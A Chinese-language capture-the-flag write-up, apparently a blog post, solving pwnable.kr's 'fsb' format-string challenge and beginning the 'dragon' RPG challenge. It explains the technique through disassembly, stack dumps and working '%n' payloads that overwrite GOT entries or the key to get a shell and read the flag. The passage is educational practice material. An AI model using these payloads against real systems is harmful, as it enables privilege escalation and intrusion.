What a tiny task :) good job!
```

------

### fsb

这是**Pwnable.kr**的第二十八个挑战`fsb`，来自**[Rookiss]**部分。

```bash
Isn't FSB almost obsolete in computer security?
Anyway, have fun with it :)

ssh fsb@pwnable.kr -p2222 (pw:guest)
```

首先通过`ssh`远程连接目标主机。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ ssh fsb@pwnable.kr -p2222
fsb@pwnable.kr's password: 
 ____  __    __  ____    ____  ____   _        ___      __  _  ____  
|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ 
|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )
|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    / 
|  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ 
|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|
                                                                     
- Site admin : daehee87@khu.ac.kr
- irc.netgarage.org:6667 / #pwnable.kr
- Simply type "irssi" command to join IRC now
- files under /tmp can be erased anytime. make your directory under /tmp
- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
You have mail.
Last login: Sat Jun 24 03:40:18 2023 from 121.60.43.65
```

然后输入`ls -la`显示所有文件及目录，并将文件型态、权限、拥有者、文件大小等信息详细列出。

```bash
fsb@pwnable:~$ ls -la
total 36
drwxr-x---   5 root fsb     4096 Oct 23  2016 .
drwxr-xr-x 117 root root    4096 Nov 10  2022 ..
d---------   2 root root    4096 Jun 30  2014 .bash_history
-r--r-----   1 root fsb_pwn   68 Jun 30  2014 flag
-r-xr-sr-x   1 root fsb_pwn 7500 Jun 30  2014 fsb
-rw-r--r--   1 root root    1167 Jun 30  2014 fsb.c
dr-xr-xr-x   2 root root    4096 Aug 20  2014 .irssi
drwxr-xr-x   2 root root    4096 Oct 23  2016 .pwntools-cache
```

输入`cat fsb.c`来查看`fsb.c`的代码。

```c
fsb@pwnable:~$ cat fsb.c
#include <stdio.h>
#include <alloca.h>
#include <fcntl.h>

unsigned long long key;
char buf[100];
char buf2[100];

int fsb(char** argv, char** envp){
    char* args[]={"/bin/sh", 0};  // 该字符串数组用于execve()函数调用
    int i;

    char*** pargv = &argv;  // 该指针指向参数argv的指针
    char*** penvp = &envp;  // 该指针指向环境变量envp的指针
    char** arg;
    char* c;
    for(arg=argv;*arg;arg++) for(c=*arg; *c;c++) *c='\0';  // 清空参数argv中的字符
    for(arg=envp;*arg;arg++) for(c=*arg; *c;c++) *c='\0';  // 清空环境变量envp中的字符
    *pargv=0;
    *penvp=0;

    for(i=0; i<4; i++){
        printf("Give me some format strings(%d)\n", i+1);
        read(0, buf, 100);  // 从标准输入中读取用户输入的字符串
        printf(buf);  // 将用户输入的字符串作为格式化字符串打印, 存在格式化字符串漏洞
    }

    printf("Wait a sec...\n");
    sleep(3);

    printf("key : \n");
    read(0, buf2, 100);  // 从标准输入中读取用户输入的key
    unsigned long long pw = strtoull(buf2, 0, 10);  // 将用户输入的字符串buf2转换为无符号64位十进制整数
    if(pw == key){
        printf("Congratz!\n");
        execve(args[0], args, 0);  // 执行/bin/sh程序, 实现提权
        return 0;
    }

    printf("Incorrect key \n");
    return 0;
}

int main(int argc, char* argv[], char** envp){
    int fd = open("/dev/urandom", O_RDONLY);  //  打开/dev/urandom设备文件
    if( fd==-1 || read(fd, &key, 8) != 8 ){   // 从/dev/urandom中读取8字节随机数作为key
        printf("Error, tell admin\n");
        return 0;
    }
    close(fd);  // 关闭/dev/urandom设备文件

    alloca(0x12345 & key);  // 使用alloca函数分配栈空间，分配大小为0x12345和key的按位与结果
	// 调用fsb函数，利用格式化字符串漏洞进行攻击
    fsb(argv, envp); // exploit this format string bug!
    return 0;
}
```

这道题考察的知识点应该是`fsb`函数中的格式化字符串漏洞，在`fsb`函数中程序先从`stdin`读取四个最多100字节的字符串到`buf`变量并使用`printf`输出格式化字符串。随后，从`stdin`读取用户输入的`buf2`并转换成64位十进制无符号整数`pw`，如果`pw`和全局变量`key`数值相等就能获得`shell`。

```assembly
fsb@pwnable:~$ gdb ./fsb
(gdb) set disassembly-flavor intel
(gdb) disassemble main
Dump of assembler code for function main:
   0x080486df <+0>:     lea    ecx,[esp+0x4]
   0x080486e3 <+4>:     and    esp,0xfffffff0
   0x080486e6 <+7>:     push   DWORD PTR [ecx-0x4]
   0x080486e9 <+10>:    push   ebp
   0x080486ea <+11>:    mov    ebp,esp
   0x080486ec <+13>:    push   ebx
   0x080486ed <+14>:    push   ecx
   0x080486ee <+15>:    sub    esp,0x30
   0x080486f1 <+18>:    mov    ebx,ecx
   0x080486f3 <+20>:    mov    DWORD PTR [esp+0x4],0x0
   0x080486fb <+28>:    mov    DWORD PTR [esp],0x80488c7
   0x08048702 <+35>:    call   0x8048430 <open@plt>
   0x08048707 <+40>:    mov    DWORD PTR [ebp-0xc],eax
   0x0804870a <+43>:    cmp    DWORD PTR [ebp-0xc],0xffffffff
   0x0804870e <+47>:    je     0x8048730 <main+81>
   0x08048710 <+49>:    mov    DWORD PTR [esp+0x8],0x8
   0x08048718 <+57>:    mov    DWORD PTR [esp+0x4],0x804a060
   0x08048720 <+65>:    mov    eax,DWORD PTR [ebp-0xc]
   0x08048723 <+68>:    mov    DWORD PTR [esp],eax
   0x08048726 <+71>:    call   0x80483e0 <read@plt>
   0x0804872b <+76>:    cmp    eax,0x8
   0x0804872e <+79>:    je     0x8048743 <main+100>
   0x08048730 <+81>:    mov    DWORD PTR [esp],0x80488d4
   0x08048737 <+88>:    call   0x8048410 <puts@plt>
   0x0804873c <+93>:    mov    eax,0x0
   0x08048741 <+98>:    jmp    0x8048796 <main+183>
   0x08048743 <+100>:   mov    eax,DWORD PTR [ebp-0xc]
   0x08048746 <+103>:   mov    DWORD PTR [esp],eax
   0x08048749 <+106>:   call   0x8048470 <close@plt>
   0x0804874e <+111>:   mov    eax,ds:0x804a060          # key_addr起始地址: 0x804a060  
   0x08048753 <+116>:   mov    edx,DWORD PTR ds:0x804a064
   0x08048759 <+122>:   and    eax,0x12345
   0x0804875e <+127>:   lea    edx,[eax+0xf]
   0x08048761 <+130>:   mov    eax,0x10
   0x08048766 <+135>:   sub    eax,0x1
   0x08048769 <+138>:   add    eax,edx
   0x0804876b <+140>:   mov    DWORD PTR [ebp-0x1c],0x10
   0x08048772 <+147>:   mov    edx,0x0
   0x08048777 <+152>:   div    DWORD PTR [ebp-0x1c]
   0x0804877a <+155>:   imul   eax,eax,0x10
   0x0804877d <+158>:   sub    esp,eax
   0x0804877f <+160>:   mov    eax,DWORD PTR [ebx+0x8]
   0x08048782 <+163>:   mov    DWORD PTR [esp+0x4],eax
   0x08048786 <+167>:   mov    eax,DWORD PTR [ebx+0x4]
   0x08048789 <+170>:   mov    DWORD PTR [esp],eax
   0x0804878c <+173>:   call   0x8048534 <fsb>
   0x08048791 <+178>:   mov    eax,0x0
   0x08048796 <+183>:   lea    esp,[ebp-0x8]
   0x08048799 <+186>:   pop    ecx
   0x0804879a <+187>:   pop    ebx
   0x0804879b <+188>:   pop    ebp
   0x0804879c <+189>:   lea    esp,[ecx-0x4]
   0x0804879f <+192>:   ret    
End of assembler dump.
(gdb) disassemble fsb
Dump of assembler code for function fsb:
   0x08048534 <+0>:     push   ebp
   0x08048535 <+1>:     mov    ebp,esp
   0x08048537 <+3>:     sub    esp,0x48
   0x0804853a <+6>:     mov    DWORD PTR [ebp-0x24],0x8048870
   0x08048541 <+13>:    mov    DWORD PTR [ebp-0x20],0x0
   0x08048548 <+20>:    lea    eax,[ebp+0x8]
   0x0804854b <+23>:    mov    DWORD PTR [ebp-0x10],eax
   0x0804854e <+26>:    lea    eax,[ebp+0xc]
   0x08048551 <+29>:    mov    DWORD PTR [ebp-0xc],eax
   0x08048554 <+32>:    mov    eax,DWORD PTR [ebp+0x8]
   0x08048557 <+35>:    mov    DWORD PTR [ebp-0x18],eax
   0x0804855a <+38>:    jmp    0x804857e <fsb+74>
   0x0804855c <+40>:    mov    eax,DWORD PTR [ebp-0x18]
   0x0804855f <+43>:    mov    eax,DWORD PTR [eax]
   0x08048561 <+45>:    mov    DWORD PTR [ebp-0x14],eax
   0x08048564 <+48>:    jmp    0x8048570 <fsb+60>
   0x08048566 <+50>:    mov    eax,DWORD PTR [ebp-0x14]
   0x08048569 <+53>:    mov    BYTE PTR [eax],0x0
   0x0804856c <+56>:    add    DWORD PTR [ebp-0x14],0x1
   0x08048570 <+60>:    mov    eax,DWORD PTR [ebp-0x14]
   0x08048573 <+63>:    movzx  eax,BYTE PTR [eax]
   0x08048576 <+66>:    test   al,al
   0x08048578 <+68>:    jne    0x8048566 <fsb+50>
   0x0804857a <+70>:    add    DWORD PTR [ebp-0x18],0x4
   0x0804857e <+74>:    mov    eax,DWORD PTR [ebp-0x18]
   0x08048581 <+77>:    mov    eax,DWORD PTR [eax]
   0x08048583 <+79>:    test   eax,eax
   0x08048585 <+81>:    jne    0x804855c <fsb+40>
   0x08048587 <+83>:    mov    eax,DWORD PTR [ebp+0xc]
   0x0804858a <+86>:    mov    DWORD PTR [ebp-0x18],eax
   0x0804858d <+89>:    jmp    0x80485b1 <fsb+125>
   0x0804858f <+91>:    mov    eax,DWORD PTR [ebp-0x18]
   0x08048592 <+94>:    mov    eax,DWORD PTR [eax]
   0x08048594 <+96>:    mov    DWORD PTR [ebp-0x14],eax
   0x08048597 <+99>:    jmp    0x80485a3 <fsb+111>
   0x08048599 <+101>:   mov    eax,DWORD PTR [ebp-0x14]
   0x0804859c <+104>:   mov    BYTE PTR [eax],0x0
   0x0804859f <+107>:   add    DWORD PTR [ebp-0x14],0x1
   0x080485a3 <+111>:   mov    eax,DWORD PTR [ebp-0x14]
   0x080485a6 <+114>:   movzx  eax,BYTE PTR [eax]
   0x080485a9 <+117>:   test   al,al
   0x080485ab <+119>:   jne    0x8048599 <fsb+101>
   0x080485ad <+121>:   add    DWORD PTR [ebp-0x18],0x4
   0x080485b1 <+125>:   mov    eax,DWORD PTR [ebp-0x18]
   0x080485b4 <+128>:   mov    eax,DWORD PTR [eax]
   0x080485b6 <+130>:   test   eax,eax
   0x080485b8 <+132>:   jne    0x804858f <fsb+91>
   0x080485ba <+134>:   mov    eax,DWORD PTR [ebp-0x10]
   0x080485bd <+137>:   mov    DWORD PTR [eax],0x0
   0x080485c3 <+143>:   mov    eax,DWORD PTR [ebp-0xc]
   0x080485c6 <+146>:   mov    DWORD PTR [eax],0x0
   0x080485cc <+152>:   mov    DWORD PTR [ebp-0x1c],0x0
   0x080485d3 <+159>:   jmp    0x8048619 <fsb+229>
   0x080485d5 <+161>:   mov    eax,DWORD PTR [ebp-0x1c]
   0x080485d8 <+164>:   lea    edx,[eax+0x1]
   0x080485db <+167>:   mov    eax,0x8048878
   0x080485e0 <+172>:   mov    DWORD PTR [esp+0x4],edx
   0x080485e4 <+176>:   mov    DWORD PTR [esp],eax
   0x080485e7 <+179>:   call   0x80483f0 <printf@plt>
   0x080485ec <+184>:   mov    DWORD PTR [esp+0x8],0x64
   0x080485f4 <+192>:   mov    DWORD PTR [esp+0x4],0x804a100
   0x080485fc <+200>:   mov    DWORD PTR [esp],0x0
   0x08048603 <+207>:   call   0x80483e0 <read@plt>     # read
   0x08048608 <+212>:   mov    eax,0x804a100
   0x0804860d <+217>:   mov    DWORD PTR [esp],eax
   0x08048610 <+220>:   call   0x80483f0 <printf@plt>   # break point
   0x08048615 <+225>:   add    DWORD PTR [ebp-0x1c],0x1
   0x08048619 <+229>:   cmp    DWORD PTR [ebp-0x1c],0x3
   0x0804861d <+233>:   jle    0x80485d5 <fsb+161>
   0x0804861f <+235>:   mov    DWORD PTR [esp],0x8048899
   0x08048626 <+242>:   call   0x8048410 <puts@plt>
   0x0804862b <+247>:   mov    DWORD PTR [esp],0x3
   0x08048632 <+254>:   call   0x8048400 <sleep@plt>
   0x08048637 <+259>:   mov    DWORD PTR [esp],0x80488a7
   0x0804863e <+266>:   call   0x8048410 <puts@plt>
   0x08048643 <+271>:   mov    DWORD PTR [esp+0x8],0x64
   0x0804864b <+279>:   mov    DWORD PTR [esp+0x4],0x804a080
   0x08048653 <+287>:   mov    DWORD PTR [esp],0x0
   0x0804865a <+294>:   call   0x80483e0 <read@plt>
   0x0804865f <+299>:   mov    DWORD PTR [esp+0x8],0xa
   0x08048667 <+307>:   mov    DWORD PTR [esp+0x4],0x0
   0x0804866f <+315>:   mov    DWORD PTR [esp],0x804a080
   0x08048676 <+322>:   call   0x8048460 <strtoull@plt>
   0x0804867b <+327>:   mov    edx,eax
   0x0804867d <+329>:   sar    edx,0x1f
   0x08048680 <+332>:   mov    DWORD PTR [ebp-0x30],eax
   0x08048683 <+335>:   mov    DWORD PTR [ebp-0x2c],edx
   0x08048686 <+338>:   mov    eax,ds:0x804a060          # key_addr: 0x804a060
   0x0804868b <+343>:   mov    edx,DWORD PTR ds:0x804a064
   0x08048691 <+349>:   mov    ecx,edx
   0x08048693 <+351>:   xor    ecx,DWORD PTR [ebp-0x2c]
   0x08048696 <+354>:   xor    eax,DWORD PTR [ebp-0x30]
   0x08048699 <+357>:   or     eax,ecx
   0x0804869b <+359>:   test   eax,eax
   0x0804869d <+361>:   jne    0x80486cc <fsb+408>
   0x0804869f <+363>:   mov    DWORD PTR [esp],0x80488ae  # 调用 execve("/bin/sh")
   0x080486a6 <+370>:   call   0x8048410 <puts@plt>
   0x080486ab <+375>:   mov    eax,DWORD PTR [ebp-0x24]   # 调用 execve("/bin/sh")
   0x080486ae <+378>:   mov    DWORD PTR [esp+0x8],0x0
   0x080486b6 <+386>:   lea    edx,[ebp-0x24]
   0x080486b9 <+389>:   mov    DWORD PTR [esp+0x4],edx
   0x080486bd <+393>:   mov    DWORD PTR [esp],eax
   0x080486c0 <+396>:   call   0x8048450 <execve@plt>
   0x080486c5 <+401>:   mov    eax,0x0
   0x080486ca <+406>:   jmp    0x80486dd <fsb+425>
   0x080486cc <+408>:   mov    DWORD PTR [esp],0x80488b8
   0x080486d3 <+415>:   call   0x8048410 <puts@plt>
   0x080486d8 <+420>:   mov    eax,0x0
   0x080486dd <+425>:   leave  
   0x080486de <+426>:   ret    
End of assembler dump.
(gdb) source /usr/share/peda/peda.py
gdb-peda$ b *fsb+220
Breakpoint 1 at 0x8048610
gdb-peda$ r
Starting program: /home/fsb/fsb 
Give me some format strings(1)
AAAAAAAA
[----------------------------------registers-----------------------------------]
EAX: 0x804a100 ("AAAAAAAA\n")
EBX: 0xfffd0320 --> 0x1 
ECX: 0x804a100 ("AAAAAAAA\n")
EDX: 0x64 ('d')
ESI: 0xf77b5000 --> 0x1b2db0 
EDI: 0xf77b5000 --> 0x1b2db0 
EBP: 0xfffbff68 --> 0xfffd0308 --> 0x0 
ESP: 0xfffbff20 --> 0x804a100 ("AAAAAAAA\n")
EIP: 0x8048610 (<fsb+220>:      call   0x80483f0 <printf@plt>)
EFLAGS: 0x203 (CARRY parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048603 <fsb+207>: call   0x80483e0 <read@plt>
   0x8048608 <fsb+212>: mov    eax,0x804a100
   0x804860d <fsb+217>: mov    DWORD PTR [esp],eax
=> 0x8048610 <fsb+220>: call   0x80483f0 <printf@plt>
   0x8048615 <fsb+225>: add    DWORD PTR [ebp-0x1c],0x1
   0x8048619 <fsb+229>: cmp    DWORD PTR [ebp-0x1c],0x3
   0x804861d <fsb+233>: jle    0x80485d5 <fsb+161>
   0x804861f <fsb+235>: mov    DWORD PTR [esp],0x8048899
Guessed arguments:
arg[0]: 0x804a100 ("AAAAAAAA\n")
[------------------------------------stack-------------------------------------]
0000| 0xfffbff20 --> 0x804a100 ("AAAAAAAA\n")
0004| 0xfffbff24 --> 0x804a100 ("AAAAAAAA\n")
0008| 0xfffbff28 --> 0x64 ('d')
0012| 0xfffbff2c --> 0x0 
0016| 0xfffbff30 --> 0x0 
0020| 0xfffbff34 --> 0x0 
0024| 0xfffbff38 --> 0x0 
0028| 0xfffbff3c --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x08048610 in fsb ()
gdb-peda$ x/24wx $esp
0xfffbff20:     0x0804a100      0x0804a100      0x00000064      0x00000000
0xfffbff30:     0x00000000      0x00000000      0x00000000      0x00000000
0xfffbff40:     0x00000000      0x08048870      0x00000000      0x00000000
0xfffbff50:     0xfffd0408      0xfffd0fe9      0xfffbff70      0xfffbff74
0xfffbff60:     0x00000000      0x00000000      0xfffd0308      0x08048791
0xfffbff70:     0x00000000      0x00000000      0x00000000      0x00000000
gdb-peda$ stack 24
0000| 0xfffbff20 --> 0x804a100 ("AAAAAAAA\n")
0004| 0xfffbff24 --> 0x804a100 ("AAAAAAAA\n")
0008| 0xfffbff28 --> 0x64 ('d')
0012| 0xfffbff2c --> 0x0 
0016| 0xfffbff30 --> 0x0 
0020| 0xfffbff34 --> 0x0 
0024| 0xfffbff38 --> 0x0 
0028| 0xfffbff3c --> 0x0 
0032| 0xfffbff40 --> 0x0 
0036| 0xfffbff44 --> 0x8048870 ("/bin/sh")
0040| 0xfffbff48 --> 0x0 
0044| 0xfffbff4c --> 0x0 
0048| 0xfffbff50 --> 0xfffd0408 --> 0x0 
0052| 0xfffbff54 --> 0xfffd0fe9 --> 0x6f682f00 ('')
0056| 0xfffbff58 --> 0xfffbff70 --> 0x0 
0060| 0xfffbff5c --> 0xfffbff74 --> 0x0 
0064| 0xfffbff60 --> 0x0 
0068| 0xfffbff64 --> 0x0 
0072| 0xfffbff68 --> 0xfffd0308 --> 0x0 
0076| 0xfffbff6c --> 0x8048791 (<main+178>:     mov    eax,0x0)
0080| 0xfffbff70 --> 0x0 
0084| 0xfffbff74 --> 0x0 
0088| 0xfffbff78 --> 0x0 
0092| 0xfffbff7c --> 0x0
```

注意到栈中第`14`和`15`个位置的值：`0xfffbff70`和`0xfffbff74`，它们正好指向后面的内存位置，即第`20`和`21`。`key`的起始地址是`0x804a060`（其十进制是`134520928`），并没有在栈上出现，有个大佬用了个有趣的办法 [**exploit.py**](https://github.com/giladreti/pwnable/blob/master/fsb/exploit.py) ——赌`0x804a060`在栈中。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ python fsb.py
[*] '/home/tyd/ctf/pwn/pwnable.kr/fsb'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Connecting to pwnable.kr on port 2222: Done
[*] fsb@pwnable.kr:
    Distro    Ubuntu 16.04
    OS:       linux
    Arch:     amd64
    Version:  4.4.179
    ASLR:     Enabled
[+] Opening new channel: b'pwd': Done
[+] Receiving all data: Done (10B)
[*] Closed SSH channel with pwnable.kr
[*] Working directory: '/tmp/tmp.aqBDhRcrZk'
[+] Opening new channel: b'ln -s /home/fsb/* .': Done
[+] Receiving all data: Done (0B)
[*] Closed SSH channel with pwnable.kr
[+] Starting remote process bytearray(b'fsb') on pwnable.kr: pid 1740
[*] Stopped remote process 'fsb' on pwnable.kr (pid 1740)
[+] Starting remote process bytearray(b'fsb') on pwnable.kr: pid 2161
[*] Stopped remote process 'fsb' on pwnable.kr (pid 2161)
[+] Starting remote process bytearray(b'fsb') on pwnable.kr: pid 2592
[*] Stopped remote process 'fsb' on pwnable.kr (pid 2592)
[+] Starting remote process bytearray(b'fsb') on pwnable.kr: pid 3011
[*] Stopped remote process 'fsb' on pwnable.kr (pid 3011)
[+] Starting remote process bytearray(b'fsb') on pwnable.kr: pid 3504
[*] Stopped remote process 'fsb' on pwnable.kr (pid 3504)
[+] Starting remote process bytearray(b'fsb') on pwnable.kr: pid 3929
[*] Stopped remote process 'fsb' on pwnable.kr (pid 3929)
[+] Starting remote process bytearray(b'fsb') on pwnable.kr: pid 4347
[*] Stopped remote process 'fsb' on pwnable.kr (pid 4347)
[+] Starting remote process bytearray(b'fsb') on pwnable.kr: pid 4810
[*] Stopped remote process 'fsb' on pwnable.kr (pid 4810)
[+] Starting remote process bytearray(b'fsb') on pwnable.kr: pid 5317
[*] Stopped remote process 'fsb' on pwnable.kr (pid 5317)
[+] Starting remote process bytearray(b'fsb') on pwnable.kr: pid 5785
[*] Stopped remote process 'fsb' on pwnable.kr (pid 5785)
[+] Starting remote process bytearray(b'fsb') on pwnable.kr: pid 6244
[*] Stopped remote process 'fsb' on pwnable.kr (pid 6244)
[+] Starting remote process bytearray(b'fsb') on pwnable.kr: pid 6984
[*] Stopped remote process 'fsb' on pwnable.kr (pid 6984)
[+] Starting remote process bytearray(b'fsb') on pwnable.kr: pid 7500
[*] Stopped remote process 'fsb' on pwnable.kr (pid 7500)
[+] Starting remote process bytearray(b'fsb') on pwnable.kr: pid 7978
[*] Stopped remote process 'fsb' on pwnable.kr (pid 7978)
[+] Starting remote process bytearray(b'fsb') on pwnable.kr: pid 8412
[*] Stopped remote process 'fsb' on pwnable.kr (pid 8412)
[+] Starting remote process bytearray(b'fsb') on pwnable.kr: pid 8943
[+] flag = 'Have you ever saw an example of utilizing [n] format character?? :('
```

正经办法的话，我们可以构造格式化字符串`%134520928d%14$n `，其中`%n`是一个格式化字符串的特殊格式，用于写入已经读取的字符数写入到相应的参数位置中。在`Linux`系统中，模块之间的调用使用*全局偏移表 (GOT)*进行，GOT表存在于可写内存中，包含函数的地址列表，并在模块加载时填充，这意味着修改GOT表可以在不触发任何内存保护的情况下实现。

```assembly
0x08048603 <+207>:   call   0x80483e0 <read@plt>
... ...
0x0804869f <+363>:   mov    DWORD PTR [esp],0x80488ae  # 调用 execve("/bin/sh")
```

可以看到`read()`函数的GOT表地址`0x804a000`（十进制数值是`134520832`）。

```assembly
gdb-peda$ disassemble 0x80483e0
Dump of assembler code for function read@plt:
   0x080483e0 <+0>:     jmp    DWORD PTR ds:0x804a000
   0x080483e6 <+6>:     push   0x0
   0x080483eb <+11>:    jmp    0x80483d0
End of assembler dump.
```

采用两阶段攻击时，我们可以先将`0x804a000`写入第`14`个位置，再将调用 `execve("/bin/sh")` 的`0x804869f`写入到第20个位置，即第14个位置所指向的内存地址。这会导致执行`read()`时直接调用 `execve("/bin/sh")`，而无需再核对用户输入的`pw`是否为`key`。此外，我们需要确保程序的输出被送入`/dev/null`中，因为它有足够多的空间用来打印字符，我们用`(>&2 cat flag)`把文件`flag`中的内容输出到标准错误流`stdin`，可以看到`Have you ever saw an example of utilizing [n] format character?? :(`。

```bash
fsb@pwnable:~$ ./fsb >/dev/null
%134520832c%14$n
%134514335c%20$n
(>&2 cat flag)
Have you ever saw an example of utilizing [n] format character?? :(
```

与修改`read()`的GOT表同理，我们也可以修改`printf()`函数的。

```assembly
0x080485e7 <+179>:   call   0x80483f0 <printf@plt>
```

`0x804a004`的十进制数是`134520836`，`0x80486ab`的十进制数是`134514347`。

```
gdb-peda$ disassemble 0x80483f0
Dump of assembler code for function printf@plt:
   0x080483f0 <+0>:     jmp    DWORD PTR ds:0x804a004
   0x080483f6 <+6>:     push   0x8
   0x080483fb <+11>:    jmp    0x80483d0
End of assembler dump.
```

同理，第15个位置指向第21个位置也是能被利用的。

```bash
fsb@pwnable:~$ ./fsb >/dev/null
%134520836c%15$n
%134514347c%21$n
(>&2 cat flag)
Have you ever saw an example of utilizing [n] format character?? :(
```

`key`的起始地址是`0x804a060`（其十进制是`134520928`），它还有一部分数据是紧接着保存在`0x804a060`（其十进制是`134520932`）。

办法总比困难多。我们可以读取/写入`key`值，将其覆盖为`0`。全局变量`key`的类型是`unsigned long long`意味着它有八字节大小，所以我们还需要覆盖紧挨着起始地址`0x804a060`的后四个字节`0x804a064`。最后输入`pw`即`0`就能拿到`flag`啦。

```bash
fsb@pwnable:~$ ./fsb >/dev/null
%134520928d%14$n           
%20$n
%134520932d%14$n
%20$n
0
(>&2 cat flag)
Have you ever saw an example of utilizing [n] format character?? :(
```

------

### dragon

这是**Pwnable.kr**的第二十九个挑战`dragon`，来自**[Rookiss]**部分。

```bash
I made a RPG game for my little brother.
But to trick him, I made it impossible to win.
I hope he doesn't get too angry with me :P!

Author : rookiss
Download : http://pwnable.kr/bin/dragon

Running at : nc pwnable.kr 9004
```

这题只给出一个二进制文件，让我们来看看。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ file ./dragon   
./dragon: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=a7a354f09b431b4523192272c448af835b35ae9b, not stripped
                                                                                                          
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ checksec --file=./dragon   
[*] '/home/tyd/ctf/pwn/pwnable.kr/dragon'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

用`IDA Pro 32bit`打开二进制文件`dragon`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  puts("Welcome to Dragon Hunter!");
  PlayGame();
  return 0;
}
```

双击`PlayGame()`函数查看详情， `$eax`寄存器中的变量`result`用来存储该函数的返回值。外层的无限循环 `while (1)`表示游戏将一直运行直到满足跳出循环的条件。内层的无限循环 `while (1)` 使用 `puts()` 函数输出一条消息，提示用户选择英雄，两个选项分别是牧师 `[1] Priest` 和骑士 `[2] Knight`。调用 `GetChoice()` 函数获取用户的选择，并将结果存储在 `result` 变量中。如果用户输入了`1`或`2`，则执行`FightDragon(result)`函数来与龙进行战斗。如果用户选择其他选项（`result` 不等于`1` 且不等于`2`），则跳出内层`while`循环。如果`result` 不等于`3` 则会跳出外层`while`循环结束程序。因此我们需要输入`3`进入隐藏关卡`SecretLevel()`。

```c
int PlayGame()
{
  int result; // eax

  while ( 1 )
  {
    while ( 1 )
    {
      puts("Choose Your Hero\n[ 1 ] Priest\n[ 2 ] Knight");
      result = GetChoice();
      if ( result != 1 && result != 2 )
        break;
      FightDragon(result);
    }
    if ( result != 3 )
      break;
    SecretLevel();
  }
  return result;
}
```

双击`SecretLevel()`函数查看详情：该函数存在宝藏 `system("/bin/sh");`。函数开始处声明了一个长度为 `10` 的字符数组 `s1`，用于存储用户输入的密码。使用 `__isoc99_scanf` 函数将用户输入的字符串存储在 `s1` 中，最多接受  `10 ` 个字符。使用 `strcmp` 函数比较用户输入的密码 `s1` 是否与`"Nice_Try_But_The_Dragons_Won't_Let_You!"` 相同。如果不相同，则输出`Wrong!`并调用`exit(-1);`退出程序。如果用户输入的密码与预设密码相同，则使用 `system` 函数执行命令 `"/bin/sh"`，启动一个`shell`。然而，`s1`最多只能接受`10`个字节，而预设密码有`39`个字节。看起来只能打龙啦？！

```c
unsigned int SecretLevel()
{
  char s1[10]; // [esp+12h] [ebp-16h] BYREF
  unsigned int v2; // [esp+1Ch] [ebp-Ch]

  v2 = __readgsdword(0x14u);
  printf("Welcome to Secret Level!\nInput Password : ");
  __isoc99_scanf("%10s", s1);
  if ( strcmp(s1, "Nice_Try_But_The_Dragons_Won't_Let_You!") )
  {
    puts("Wrong!\n");
    exit(-1);
  }
  system("/bin/sh");
  return __readgsdword(0x14u) ^ v2;
}
```

不急着做题，其他函数也顺带分析下吧。双击`GetChoice()`函数查看详情。整型数组`v1`用来存储用户输入的选项，注释中的 `[esp+1Ch] [ebp-Ch] BYREF` 表示该数组是通过引用传递（By Reference）的方式使用。 `__isoc99_scanf("%d", v1)` 函数从用户输入中读取一个整数，并将其存储在数组 `v1` 的第一个元素中（`v1[0]`）。在读取用户输入后，使用 `getchar()` 函数读取剩余的字符，直到读取到换行符（ASCII 值为 10）；这是为了清除输入缓冲区中的额外字符，以防止它们影响后续的输入。`GetChoice()`函数返回数组 `v1` 的第一个元素（`v1[0]`），即用户输入的选择作为函数的返回值。

```c
int GetChoice()
{
  int v1[3]; // [esp+1Ch] [ebp-Ch] BYREF

  __isoc99_scanf("%d", v1);
  while ( getchar() != 10 )
    ;
  return v1[0];
}
```

回到`PlayGame()`函数，双击`FightDragon()`函数查看详情，可以发现母龙血厚攻击低，幼龙血薄伤害高，牧师生命值`42`法力值`50`，骑士生命值`50`没蓝。龙的生命值保存在`1`个字节中，意味着龙最大生命值是`127`，回血的时候存在溢出漏洞。

```c
void __cdecl FightDragon(int a1)
{
  char v1; // al
  int v2; // [esp+10h] [ebp-18h]
  _DWORD *ptr; // [esp+14h] [ebp-14h]  // 指向_DWORD类型的指针ptr
  _DWORD *v4; // [esp+18h] [ebp-10h]   // 指向_DWORD类型的指针v4
  void *v5; // [esp+1Ch] [ebp-Ch]      // 指向void类型的指针v5

  ptr = malloc(0x10u);  // 分配16个字节的内存空间
  v4 = malloc(0x10u);   // 分配16个字节的内存空间
  v1 = Count++;         // 全局变量或静态变量Count可能用于记录战斗的次数
  if ( (v1 & 1) != 0 )  // 按位与运算检查Count的最低位是否为1, 最低位为1则表示奇数次战斗
  {
    v4[1] = 1;                // 将v4指针的第二个_DWORD元素设置为1
    *((_BYTE *)v4 + 8) = 80;  // 将v4指针的第一个_BYTE元素设置为80, 即龙的生命值
    *((_BYTE *)v4 + 9) = 4;   // 将v4指针的第二个_BYTE元素设置为4, 即龙每次回复的生命值
    v4[3] = 10;               // 将v4指针的第四个_DWORD元素设置为10, 即龙的攻击力
    *v4 = PrintMonsterInfo;   // 将PrintMonsterInfo函数的地址赋给v4指针的第一个_DWORD元素
